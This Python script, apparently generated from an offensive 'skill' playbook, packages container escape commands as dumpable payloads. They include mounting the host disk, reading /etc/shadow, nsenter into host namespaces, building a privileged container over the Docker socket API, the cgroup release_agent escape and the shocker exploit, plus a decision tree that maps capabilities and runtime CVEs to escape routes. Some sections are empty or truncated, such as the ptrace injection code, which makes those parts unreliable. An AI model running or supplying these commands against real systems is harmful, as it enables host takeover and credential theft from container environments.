#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/container-escape-techniques

Skill: SKILL: Container Escape Techniques — Expert Attack Playbook
Desc : >-

Run:  python hack-skills-container-escape-techniques.py --help
      python hack-skills-container-escape-techniques.py --list
      python hack-skills-container-escape-techniques.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/container-escape-techniques'
TITLE = 'SKILL: Container Escape Techniques — Expert Attack Playbook'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: container-escape-techniques", "description: >-", "Container escape playbook. Use when operating inside a Docker container, LXC, or Kubernetes pod and need to escape to the host via privileged mode, capabilities, Docker socket, cgroup abuse, namespace tricks, or runtime vulnerabilities."],
    'skill-container-escape-techniques-expert-attack-playbook': [],
    '0-related-routing': ["Before going deep, consider loading:", "- [linux-privilege-escalation](../linux-privilege-escalation/SKILL.md) when you first need root inside the container before attempting escape", "- [kubernetes-pentesting](../kubernetes-pentesting/SKILL.md) for K8s-specific attack paths beyond pod escape", "- [linux-security-bypass](../linux-security-bypass/SKILL.md) when seccomp/AppArmor blocks your escape technique"],
    'advanced-reference': ["Also load [DOCKER_ESCAPE_CHAINS.md](./DOCKER_ESCAPE_CHAINS.md) when you need:", "- Step-by-step escape chains for common misconfigurations", "- Docker-in-Docker escape scenarios", "- Kubernetes-specific escape paths with full command sequences"],
    '1-am-i-in-a-container': ["```bash"],
    'quick-checks': ["cat /proc/1/cgroup 2>/dev/null | grep -qi \"docker\\|kubepods\\|containerd\"", "ls -la /.dockerenv 2>/dev/null", "cat /proc/self/mountinfo | grep -i \"overlay\\|docker\\|kubelet\"", "hostname    # random hex = likely container"],
    'detailed-check': ["cat /proc/1/status | head -5   # PID 1 is not systemd/init?", "mount | grep -i \"overlay\"      # overlay filesystem?", "ip addr                         # veth interface? limited NICs?"],
    'tools-for-container-detection': ["```bash"],
    'amicontained-shows-container-runtime-capabilities-seccomp': ["./amicontained"],
    'deepce-docker-enumeration-and-exploit-suggester': ["./deepce.sh"],
    'cdk-all-in-one-container-pentesting-toolkit': ["./cdk evaluate"],
    '2-privileged-container-escape': ["If `--privileged` flag was used, the container has nearly all host capabilities and device access."],
    '2-1-mount-host-filesystem': ["```bash"],
    'check-if-privileged': ["cat /proc/self/status | grep CapEff"],
    'capeff-0000003fffffffff-fully-privileged': [],
    'find-host-disk': ["fdisk -l 2>/dev/null || lsblk"],
    'usually-dev-sda1-or-dev-vda1': [],
    'mount-host-root': ["mkdir -p /mnt/host", "mount /dev/sda1 /mnt/host"],
    'access-host-filesystem': ["cat /mnt/host/etc/shadow", "chroot /mnt/host bash"],
    '2-2-nsenter-enter-host-namespaces': ["```bash"],
    'from-privileged-container-enter-host-pid-1-s-namespaces': ["nsenter --target 1 --mount --uts --ipc --net --pid -- bash"],
    'this-gives-a-shell-in-the-host-s-namespace-context': [],
    'effectively-a-full-host-shell': [],
    '2-3-privileged-host-pid-namespace': ["```bash"],
    'if-hostpid-true-is-set-kubernetes': [],
    'access-host-processes-via-proc': ["ls /proc/1/root/     # Host root filesystem", "cat /proc/1/root/etc/shadow"],
    'inject-into-host-process': ["nsenter --target 1 --mount -- bash"],
    '3-capability-based-escape': [],
    '3-1-cap-sys-admin-most-versatile': ["```bash"],
    'check-capabilities': ["capsh --print 2>/dev/null", "grep CapEff /proc/self/status"],
    'escape-via-mounting': ["mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp"],
    'or-mount-host-filesystem-if-device-access-exists': ["mount /dev/sda1 /mnt/host 2>/dev/null"],
    '3-2-cap-sys-ptrace-process-injection': ["```bash"],
    'inject-shellcode-into-a-host-process-requires-host-pid-namespace': [],
    'find-a-root-process': ["ps aux | grep root"],
    'use-gdb-or-python-ptrace-to-inject': ["python3 << 'EOF'", "import ctypes", "import ctypes.util", "libc = ctypes.CDLL(ctypes.util.find_library(\"c\"))"],
    'attach-to-host-process-inject-shellcode': [],
    'full-inject-shellcode-implementation': [],
    '3-3-cap-net-admin': ["```bash"],
    'manipulate-host-network-if-host-network-namespace-is-shared': [],
    'arp-spoofing-route-manipulation-traffic-interception': ["iptables -L            # Can see/modify host firewall rules?", "ip route               # Can modify routing?"],
    '3-4-cap-dac-read-search-shocker-exploit': ["```bash"],
    'open-by-handle-at-bypass-read-files-from-host': [],
    'compile-and-run-the-shocker-exploit': [],
    'works-when-dac-read-search-capability-is-granted': ["gcc shocker.c -o shocker", "./shocker /etc/shadow   # Read host file"],
    '4-docker-socket-escape-var-run-docker-sock': ["```bash", "ls -la /var/run/docker.sock   # Check if mounted"],
    'with-docker-cli': ["docker run -v /:/host --privileged -it alpine chroot /host bash"],
    'without-cli-curl-only-create-privileged-container-via-api': ["curl -s --unix-socket /var/run/docker.sock \\", "-X POST http://localhost/containers/create \\", "-H \"Content-Type: application/json\" \\", "-d '{\"Image\":\"alpine\",\"Cmd\":[\"/bin/sh\"],\"Tty\":true,\"OpenStdin\":true,", "\"HostConfig\":{\"Binds\":[\"/:/host\"],\"Privileged\":true}}'"],
    'start-exec-chroot-host-bash-see-docker-escape-chains-md-for-full-sequence': [],
    '5-cgroup-v1-release-agent-escape': ["Classic escape for containers with CAP_SYS_ADMIN + cgroup v1.", "```bash", "d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))", "mkdir -p $d/w && echo 1 > $d/w/notify_on_release", "host_path=$(sed -n 's/.*\\bperdir=\\([^,]*\\).*/\\1/p' /etc/mtab)", "echo \"$host_path/cmd\" > $d/release_agent", "cat > /cmd << 'EOF'", "cat /etc/shadow > /output 2>&1       # Or: reverse shell", "chmod +x /cmd", "sh -c \"echo \\$\\$ > $d/w/cgroup.procs\" && sleep 1", "cat /output"],
    '6-cgroup-v2-ebpf-escape': ["```bash"],
    'cgroup-v2-no-release-agent-file': [],
    'check-cgroup-version': ["mount | grep cgroup"],
    'cgroup2-v2': [],
    'ebpf-based-escape-requires-cap-sys-admin-cap-bpf-or-equivalent': [],
    'kernel-5-8-with-unprivileged-ebpf-enabled': ["cat /proc/sys/kernel/unprivileged_bpf_disabled"],
    '0-ebpf-available-to-unprivileged-users': [],
    '7-namespace-escape': [],
    'user-namespace': ["```bash"],
    'if-user-namespace-creation-is-allowed-inside-container': ["unshare -U --map-root-user bash"],
    'now-root-inside-new-namespace': [],
    'combined-with-other-capabilities-mount-host-filesystem': [],
    'pid-namespace-escape': ["```bash"],
    'if-hostpid-true-shared-pid-namespace-with-host': [],
    'access-host-processes-directly': ["ls /proc/1/root/          # Host's root filesystem", "cat /proc/1/root/etc/shadow"],
    'inject-into-host-process': ["nsenter -t 1 -m -u -i -n -p -- bash"],
    '8-runtime-vulnerabilities': [],
    'runc-cve-2019-5736': ["Overwrites host runc binary when `docker exec` is used.", "```bash"],
    'conditions-docker-exec-into-a-malicious-container-triggers-exploit': [],
    'the-container-s-bin-sh-is-replaced-with-exploit-binary': [],
    'when-next-exec-happens-overwrites-usr-bin-runc-on-host': [],
    'poc-modify-entrypoint-to-overwrite-runc': [],
    'this-is-a-one-shot-exploit-runc-is-replaced-permanently': [],
    'containerd-cve-2020-15257': ["```bash"],
    'host-network-namespace-shared-containerd-1-3-9-1-4-3': [],
    'abstract-unix-socket-accessible-from-container': [],
    'connect-to-containerd-shim-api-via-containerd-shim-sock': [],
    'cgroups-cve-2022-0492': ["```bash"],
    'unpatched-kernel-allows-cgroup-escape-without-cap-sys-admin': [],
    'release-agent-writable-by-unprivileged-user-in-container': [],
    '9-kubernetes-pod-escape': ["See [kubernetes-pentesting](../kubernetes-pentesting/SKILL.md) for full K8s attack paths."],
    '10-tools': [],
    '11-container-escape-decision-tree': ["Inside a container?", "\u251c\u2500\u2500 Privileged mode? (CapEff = 0000003fffffffff)", "\u2502   \u251c\u2500\u2500 Yes \u2192 mount host disk (\u00a72.1) or nsenter (\u00a72.2)", "\u2502   \u2514\u2500\u2500 Partial capabilities? Check each:", "\u2502       \u251c\u2500\u2500 CAP_SYS_ADMIN \u2192 cgroup release_agent (\u00a75) or mount (\u00a73.1)", "\u2502       \u251c\u2500\u2500 CAP_SYS_PTRACE + hostPID \u2192 process injection (\u00a73.2)", "\u2502       \u251c\u2500\u2500 CAP_DAC_READ_SEARCH \u2192 shocker exploit (\u00a73.4)", "\u2502       \u2514\u2500\u2500 CAP_NET_ADMIN + hostNetwork \u2192 network manipulation (\u00a73.3)", "\u251c\u2500\u2500 Docker socket mounted? (/var/run/docker.sock)", "\u2502   \u2514\u2500\u2500 Yes \u2192 create privileged container (\u00a74)", "\u251c\u2500\u2500 Host PID namespace shared?", "\u2502   \u2514\u2500\u2500 Yes \u2192 nsenter -t 1 or /proc/1/root access (\u00a77)", "\u251c\u2500\u2500 Cgroup v1?", "\u2502   \u2514\u2500\u2500 + CAP_SYS_ADMIN \u2192 release_agent escape (\u00a75)", "\u251c\u2500\u2500 Runtime vulnerable?", "\u2502   \u251c\u2500\u2500 runc < 1.0.0-rc6 \u2192 CVE-2019-5736 (\u00a78)", "\u2502   \u2514\u2500\u2500 containerd < 1.3.9 \u2192 CVE-2020-15257 (\u00a78)", "\u251c\u2500\u2500 Kernel vulnerable?", "\u2502   \u2514\u2500\u2500 Check KERNEL_EXPLOITS_CHECKLIST in linux-privilege-escalation", "\u251c\u2500\u2500 Kubernetes pod?", "\u2502   \u251c\u2500\u2500 Service account with elevated RBAC? \u2192 create escape pod (\u00a79)", "\u2502   \u2514\u2500\u2500 hostPath volume? \u2192 access host filesystem", "\u2514\u2500\u2500 None of the above?", "\u251c\u2500\u2500 Run deepce/CDK for automated detection", "\u251c\u2500\u2500 Check for writable host mount points", "\u251c\u2500\u2500 Enumerate network for other containers/services", "\u2514\u2500\u2500 Check /proc/self/mountinfo for interesting mounts"],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()